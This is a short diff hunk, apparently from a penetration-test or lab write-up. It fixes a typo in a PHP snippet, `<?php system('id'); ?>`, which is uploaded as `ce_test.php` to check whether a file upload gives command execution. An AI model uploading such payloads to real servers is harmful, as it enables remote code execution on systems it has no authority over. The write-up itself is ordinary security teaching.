@@ -189,7 +189,7 @@ So, we can upload a PHP snippet code to verify that we can upload files and if t
 We create a file `ce_test.php` with the following content:
 
 ```php
-S<?php system('id'); ?>
+<?php system('id'); ?>
 ```
 
 Leaving aside a bunch of errors, it seems that the file has been uploaded.
